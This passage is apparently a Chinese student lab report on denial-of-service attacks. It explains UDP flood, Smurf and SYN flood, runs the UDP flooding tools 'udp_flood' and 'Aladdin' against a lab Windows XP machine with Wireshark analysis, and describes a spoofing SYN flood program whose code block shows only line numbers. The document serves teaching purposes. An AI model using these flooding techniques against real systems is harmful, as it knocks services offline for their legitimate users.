                        <a href="#%e5%b7%a5%e5%85%b7" aria-label="工具：">工具：</a><ul>
                            
                    <li>
                        <a href="#udp-flood" aria-label="udp-Flood">udp-Flood</a></li>
                    <li>
                        <a href="#%e9%98%bf%e6%8b%89%e4%b8%81" aria-label="阿拉丁">阿拉丁</a></li>
                    <li>
                        <a href="#visual-studio-code" aria-label="visual studio code">visual studio code</a></li>
                    <li>
                        <a href="#wireshark" aria-label="wireshark">wireshark</a></li></ul>
                    </li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#0x04-%e5%b7%a5%e5%85%b7%e5%88%86%e6%9e%90" aria-label="0x04 工具分析">0x04 工具分析</a><ul>
                            
                    <li>
                        <a href="#udp_flood" aria-label="udp_Flood">udp_Flood</a></li>
                    <li>
                        <a href="#%e9%98%bf%e6%8b%89%e4%b8%81-1" aria-label="阿拉丁">阿拉丁</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x05-syn-flood-%e7%bc%96%e7%a8%8b%e5%ae%9e%e7%8e%b0" aria-label="0x05 SYN-Flood 编程实现">0x05 SYN-Flood 编程实现</a></li>
                    <li>
                        <a href="#0x06-%e5%ae%9e%e9%aa%8c%e7%bb%93%e8%ae%ba" aria-label="0x06 实验结论">0x06 实验结论</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h1 id="拒绝服务攻击">拒绝服务攻击<a hidden class="anchor" aria-hidden="true" href="#拒绝服务攻击">#</a></h1>
<h2 id="0x01-实验目的">0x01 实验目的<a hidden class="anchor" aria-hidden="true" href="#0x01-实验目的">#</a></h2>
<ul>
<li>
<h5 id="使用udp-flood阿拉丁等工具分组展开攻击并利用wireshark分析">使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。<a hidden class="anchor" aria-hidden="true" href="#使用udp-flood阿拉丁等工具分组展开攻击并利用wireshark分析">#</a></h5>
</li>
<li>
<h5 id="编程实现syn-flood攻击">编程实现SYN Flood攻击。<a hidden class="anchor" aria-hidden="true" href="#编程实现syn-flood攻击">#</a></h5>
</li>
</ul>
<h2 id="0x02-实验前提知识">0x02 实验前提知识<a hidden class="anchor" aria-hidden="true" href="#0x02-实验前提知识">#</a></h2>
<ul>
<li>
<h4 id="dosdenial-of-service攻击">DoS（Denial of Service）攻击<a hidden class="anchor" aria-hidden="true" href="#dosdenial-of-service攻击">#</a></h4>
<ul>
<li>
<h5 id="凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击">凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。<a hidden class="anchor" aria-hidden="true" href="#凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击">#</a></h5>
</li>
</ul>
</li>
<li>
<h4 id="ddosdistributed-denial-of-service攻击">DDoS（Distributed Denial of Service）攻击<a hidden class="anchor" aria-hidden="true" href="#ddosdistributed-denial-of-service攻击">#</a></h4>
<ul>
<li>
<h5 id="借助数百数千被植入攻击守护进程的主机对目标展开的集团式拒绝服务攻击通常针对高带宽高性能网站">借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站<a hidden class="anchor" aria-hidden="true" href="#借助数百数千被植入攻击守护进程的主机对目标展开的集团式拒绝服务攻击通常针对高带宽高性能网站">#</a></h5>
</li>
</ul>
</li>
<li>
<h4 id="ddos攻击类型">DDoS攻击类型<a hidden class="anchor" aria-hidden="true" href="#ddos攻击类型">#</a></h4>
<ul>
<li>
<p>基于操作系统/应用软件漏洞的DDoS攻击；</p>
</li>
<li>
<p>基于协议漏洞的网络层DDoS攻击；</p>
<ul>
<li>利用协议漏洞，导致目标资源被大幅占用。是最常见的攻击方式，但需要一定规模的傀儡主机。</li>
</ul>
</li>
<li>
<p>面向网络资源的DDoS攻击；</p>
<ul>
<li>攻击者控制傀儡机同时发送正常报文，导致目标资源被耗尽。这种攻击方式最难防范，攻击者也需要控制较大规模的主机或服务器</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="ping-of-death">Ping of Death<a hidden class="anchor" aria-hidden="true" href="#ping-of-death">#</a></h4>
<ul>
<li>攻击点：操作系统协议栈没有处理例外情况的设计缺陷。</li>
<li>原理：利用了协议实现时的漏洞（CVE-1999-0128）。ICMP协议用于诊断网络状况（端点是否可达等）。正常情况下，A向B发送ICMP echo request，B收到后返回ICMP echo reply。则A知道，B在线、可达。ICMP包除了包头外，还可以携带数据。这些数据不用于进一步处理，仅辅助诊断网络状况（根据收到响应的时间判断网络是否通畅）。攻击者制造超长数据包，使得数据包超过65535字节上限。没有异常处理的协议栈，收到这样的数据包，可能会由于缓存区溢出而崩溃。（IP数据包的最大长度为65535B，IP首部长度为20B，ICMP首部为8字节，ICMP包最大数据长度为：65535-20-8=65507B.</li>
</ul>
</li>
<li>
<h4 id="smurf">Smurf<a hidden class="anchor" aria-hidden="true" href="#smurf">#</a></h4>
<ul>
<li>以目标IP为源地址，以广播地址为目地址，发送ICMP Echo请求。广播地址对应网络上的每台主机都能收到请求，并向目标发送ICMP Reply，导致目标被大量应答占据资源。</li>
</ul>
</li>
<li>
<h4 id="udpsmurf">UdpSmurf<a hidden class="anchor" aria-hidden="true" href="#udpsmurf">#</a></h4>
<ul>
<li>利用7号(echo)端口。根据协议，若端口开放，则回送应答UDP数据包。若端口关闭，则发送一个ICMP报文（目标不可达）。
攻击者以广播地址为目标地址，以受害者地址为源地址，使得大量应答包送往受害者。</li>
</ul>
</li>
<li>
<h4 id="tcp-syn-flood攻击">TCP SYN Flood攻击<a hidden class="anchor" aria-hidden="true" href="#tcp-syn-flood攻击">#</a></h4>
<ul>
<li>通过虚假的数据包，造成目标保存大量半开TCP连接。</li>
<li>管理TCP连接需要系统资源，系统能忍受的半开连接有上限。</li>
<li>当半开连接达到一定数目时，系统将不再接收新的连接请求。</li>
<li>正常的服务请求因此得不到响应。</li>
<li>TCP正常连接过程
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011204029157.png" alt="image-20211011204029157"  />
</li>
</ul>
</li>
<li>A发送SYN包后死机或掉线
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011204459101.png" alt="image-20211011204459101"  />
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>TCP协议头</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/MBXY-CR-87caac6fecc1de031efcd664df077305.png" alt="img"  />
</li>
</ul>
</li>
<li>
<p>TCP伪首部</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/MBXY-CR-402da2d7f554943af39d2c1395884998.png" alt="img"  />
</li>
<li>伪首部共有 12 字节，包含 IP 协议头部的一些字段，有如下信息：<strong>32位源IP地址</strong>、<strong>32位目的IP地址</strong>、<strong>8位保留字节(置0)</strong>、<strong>8位传输层协议号(TCP是6，UDP是17)</strong>、<strong>16位TCP报文长度(TCP首部+数据)</strong>。</li>
<li>TCP 协议校验和计算三部分：<strong>TCP伪首部</strong> + <strong>TCP头部</strong> + <strong>TCP数据</strong>。</li>
</ul>
</li>
<li>
<p>IP 头部</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/MBXY-CR-6eee95c080549c62877739a48e5c8ffd.png" alt="img"  />
</li>
</ul>
</li>
<li>
<p>TCP 协议通过一种名为 <strong>三次握手</strong> 的过程来建立客户端与服务端的连接，<strong>三次握手</strong> 过程的原理如图</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011220946719.png" alt="image-20211011220946719"  />
</p>
</li>
<li>
<p>建立连接三次握手过程如下：</p>
<ul>
<li>
<p>客户端需要发送一个 <code>SYN包</code> 给服务端（包含了客户端初始化序列号），并且将连接的状态设置为 <code>SYN_SENT</code>，这个过程由 <code>connect()</code> 系统调用完成。</p>
</li>
<li>
<p>服务端接收到客户端发送过来的 <code>SYN包</code> 后，回复一个 <code>SYN+ACK包</code> 给客户端（包含了服务端初始化序列号），并且设置连接的状态为 <code>SYN_RCVD</code>。</p>
</li>
<li>
<p>客户端接收到服务端发送过来的 <code>SYN+ACK包</code> 后，设置连接状态为 <code>ESTABLISHED</code>（表示连接已经建立），并且回复一个 <code>ACK包</code> 给服务端。</p>
</li>
<li>
<p>服务端接收到客户端发送过来的 <code>ACK包</code> 后，将连接状态设置为 <code>ESTABLISHED</code>（表示连接已经建立）。</p>
</li>
</ul>
</li>
<li>
<p>当 <strong>三次握手</strong> 过程完成后，一个 TCP 连接就此建立完成。</p>
</li>
</ul>
</li>
<li>
<p>SYN-flood攻击大概有以下三种攻击方式：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011224904962.png" alt="image-20211011224904962"  />
</p>
<ul>
<li>Direct Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。</li>
<li>Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。</li>
<li>Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击</li>
</ul>
</li>
</ul>
<h2 id="0x03-实验环境">0x03 实验环境<a hidden class="anchor" aria-hidden="true" href="#0x03-实验环境">#</a></h2>
<ul>
<li>
<h4 id="部署于同一局域网下">部署于同一局域网下<a hidden class="anchor" aria-hidden="true" href="#部署于同一局域网下">#</a></h4>
</li>
<li>
<h4 id="攻击机-网络安全实验-windows-xp">攻击机 网络安全实验 Windows xp<a hidden class="anchor" aria-hidden="true" href="#攻击机-网络安全实验-windows-xp">#</a></h4>
<ul>
<li>IP:<code>192.168.195.131</code></li>
<li>MAC :<code>00-0C-29-06-65-C9</code></li>
</ul>
</li>
<li>
<h4 id="靶机-汇编-windows-xp">靶机 汇编 Windows xp<a hidden class="anchor" aria-hidden="true" href="#靶机-汇编-windows-xp">#</a></h4>
<ul>
<li>IP:<code>192.168.195.135</code></li>
<li>MAC : <code> 00-0c-29-19-ba-6e</code></li>
</ul>
</li>
<li>
<h4 id="程序运行机器-ubuntu-16">程序运行机器 Ubuntu 16<a hidden class="anchor" aria-hidden="true" href="#程序运行机器-ubuntu-16">#</a></h4>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011210108625.png" alt="image-20211011210108625"  />
</li>
</ul>
</li>
<li>
<h4 id="网关">网关<a hidden class="anchor" aria-hidden="true" href="#网关">#</a></h4>
<ul>
<li>IP  : <code>192.168.195.2</code></li>
<li>MAC : <code> 00-50-56-e7-d4-22</code></li>
</ul>
</li>
<li>
<h4 id="工具">工具：<a hidden class="anchor" aria-hidden="true" href="#工具">#</a></h4>
<ul>
<li>
<h5 id="udp-flood">udp-Flood<a hidden class="anchor" aria-hidden="true" href="#udp-flood">#</a></h5>
</li>
<li>
<h5 id="阿拉丁">阿拉丁<a hidden class="anchor" aria-hidden="true" href="#阿拉丁">#</a></h5>
</li>
<li>
<h5 id="visual-studio-code">visual studio code<a hidden class="anchor" aria-hidden="true" href="#visual-studio-code">#</a></h5>
</li>
<li>
<h5 id="wireshark">wireshark<a hidden class="anchor" aria-hidden="true" href="#wireshark">#</a></h5>
</li>
</ul>
</li>
</ul>
<h2 id="0x04-工具分析">0x04 工具分析<a hidden class="anchor" aria-hidden="true" href="#0x04-工具分析">#</a></h2>
<h3 id="udp_flood">udp_Flood<a hidden class="anchor" aria-hidden="true" href="#udp_flood">#</a></h3>
<ul>
<li>
<p>首先看一下靶机<code>IP:192.168.195.135</code>开放的端口</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011210218298.png" alt="image-20211011210218298"  />
</li>
<li>发现TCP中21、22、80端口均开启，UDP开启445,500端口</li>
</ul>
</li>
<li>
<p>首先在攻击机打开udp_flood工具，对80端口进行攻击。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011210408475.png" alt="image-20211011210408475"  />
</li>
<li>每秒发11个包</li>
</ul>
</li>
<li>
<p>然后在靶机中打开Wireshark进行抓包</p>
<ul>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011210634938.png" alt="image-20211011210634938"  />
</p>
</li>
<li>
<p>容易发现，攻击机向靶机每发一个UDP包，靶机就会回应一个ICMP包</p>
<ul>
<li>
<p>不难发现，udp包的数据流都没有问题，所有udp包的大小相同，协议相同，短时间发送大量的包</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011212441326.png" alt="image-20211011212441326"  />
</li>
</ul>
</li>
<li>
<p>但是服务器回显ICMP显示<code>Port Unreachable</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011211754255.png" alt="image-20211011211754255"  />
</li>
</ul>
</li>
<li>
<p>这是因为服务器响应发送到其中一个端口的UDP数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到UDP数据包时，会经过两个步骤：</p>
<ul>
<li>服务器首先检查是否正在运行正在侦听指定端口的请求的程序。</li>
<li>如果没有程序在该端口接收数据包，则服务器使用ICMP（ping）数据包进行响应，以通知发送方目的地不可达。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>80端口并没有UDP进行监听，因此服务器会返回一个ICMP包，告诉发送方不可到达。</p>
</li>
</ul>
</li>
<li>
<p>这里利用UDP开始监听的445端口进行实验</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011212225396.png" alt="image-20211011212225396"  />
</li>
<li>udp发送的包同样没有问题，大小相同，均为83。</li>
</ul>
</li>
<li>
<p>这里查看一下udp_flood攻击之前的时间</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012120634764.png" alt="image-20211012120634764"  />
</li>
<li>然后打开udp_flood，攻击80端口
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012120758489.png" alt="image-20211012120758489"  />
</li>
</ul>
</li>
<li>可以看到阿拉丁udp_flood攻击之后，访问百度会丢包，然后平均时间也增加了</li>
<li>因此，udp_flood一定程度上会阻碍服务器的访问速度。</li>
</ul>
</li>
<li>
<p>因此，在udp_flood攻击中，攻击者可发送大量伪造源IP地址的小udp包。由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击方式消耗的是攻击者与靶机方两方资源的比拼。</p>
</li>
</ul>
<h3 id="阿拉丁-1">阿拉丁<a hidden class="anchor" aria-hidden="true" href="#阿拉丁-1">#</a></h3>
<ul>
<li>首先查看一下靶机开放的端口
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011213015846.png" alt="image-20211011213015846"  />
</li>
</ul>
</li>
<li>在攻击机中打开阿拉丁udp洪水攻击器
<ul>
<li>首先工具靶机的80端口
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011213105321.png" alt="image-20211011213105321"  />
</li>
<li>便于测试，这里进行一般udp攻击</li>
</ul>
</li>
</ul>
</li>
<li>在靶机中跟据Wireshark进行抓包
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011213231924.png" alt="image-20211011213231924"  />
</li>
<li>分析一下udp数据包
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011213352709.png" alt="image-20211011213352709"  />
</li>
<li>可以很明显的看到udp数据包的源IP、MAC和目的IP、MAC都是正确的，唯一异常的是udp传送的数据包Data的数据过长，为3000byte,</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011231319734.png" alt="image-20211011231319734"  />
</li>
<li>同时udp因为超过1500会分片传输，大大提高了攻击的效率。</li>
</ul>
</li>
</ul>
</li>
<li>将端口改为445
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011214256018.png" alt="image-20211011214256018"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011214324449.png" alt="image-20211011214324449"  />

<ul>
<li>分析一下udp的结构</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011214401285.png" alt="image-20211011214401285"  />
</li>
</ul>
</li>
<li>发现也完全符合预期，和udp_flood相比，只是包的大小变大了，DDOS的威力也更强大了。</li>
</ul>
</li>
<li>这里查看一下工具前 <code>ping www.baidu.com</code>的时延
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012121137056.png" alt="image-20211012121137056"  />
</li>
<li>攻击靶机的80端口
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012121407040.png" alt="image-20211012121407040"  />
</li>
</ul>
</li>
<li>很明显看到攻击后的udp攻击使得服务器的最高时延增加。</li>
<li>因此，udp_flood一定程度上会阻碍服务器的访问速度。</li>
</ul>
</li>
<li>由此可以知道，udp_flood工具和阿拉丁的原理相同，都是利用UDP洪水攻击，大批量的消耗资源来进行DDOS攻击。</li>
<li>攻击效果的话，如果带宽、流量足够大的话，服务器的会不断的接受包、然后瘫痪、无法正常上网。</li>
</ul>
<h2 id="0x05-syn-flood-编程实现">0x05 SYN-Flood 编程实现<a hidden class="anchor" aria-hidden="true" href="#0x05-syn-flood-编程实现">#</a></h2>
<ul>
<li>
<p>这里用套接字socket的方法来实现syn-flood攻击</p>
</li>
<li>
<p>只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。</p>
</li>
<li>
<p>我们这里在ubuntu 16 的环境中编译我们写好的程序</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011222520713.png" alt="image-20211011222520713"  />
</li>
</ul>
</li>
<li>
<p>首先查看一下靶机(<code>IP : 192.168.195.135</code>)的开放端口</p>
<ul>
<li>发现开启了21、22、80端口</li>
</ul>
</li>
<li>
<p>在程序中，对<code>192.168.195.135</code>的80端口进行攻击</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011223856106.png" alt="image-20211011223856106"  />
</li>
<li>因为程序是无限循环发送，需要手动终止</li>
</ul>
</li>
<li>
<p>与此同时，利用Wireshark在靶机进行抓包</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211011224107724.png" alt="image-20211011224107724"  />
</li>
<li>可以看到程序随机产生大量的虚假地址和虚假的端口对靶机的80端口进行访问，因为地址和端口都为虚假的，所以大量的tcp连接靶机无法对其ack回复。</li>
</ul>
</li>
<li>
<p>产生大量的syn半连接，导致服务器载荷过大，从而崩溃。</p>
<ul>
<li>查看此时的syn状态。
<ul>
<li><img loading="lazy" src="/Users/reus09/myblog/content/posts/tech/C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20211011224348448.png" alt="image-20211011224348448"  />
</li>
</ul>
</li>
<li>可以很清晰的看到，程序产生了大量的syn半连接，来自不同的虚假ip地址和端口</li>
</ul>
</li>
<li>
<p>查看攻击前 ping <a href="https://www.baidu.com">www.baidu.com</a> 的效果</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012123323505.png" alt="image-20211012123323505"  />
</li>
<li>攻击其21端口
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012123536156.png" alt="image-20211012123536156"  />
</li>
<li>发现ping <a href="https://www.baidu.com">www.baidu.com</a> 已经不能Ping通</li>
</ul>
</li>
</ul>
</li>
<li>
<p>同时很明显的感受到Windows xp因为受到SYN攻击，因此运行不流畅，卡顿相当严重。</p>
</li>
<li>
<p>实际上，SYN-flood攻击就是 构造大量的SYN包、里面填充虚假的IP、MAC地址，来造成服务器产生大量的半连接，从而造成服务器运行瘫痪。</p>
</li>
<li>
<p>完整代码如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
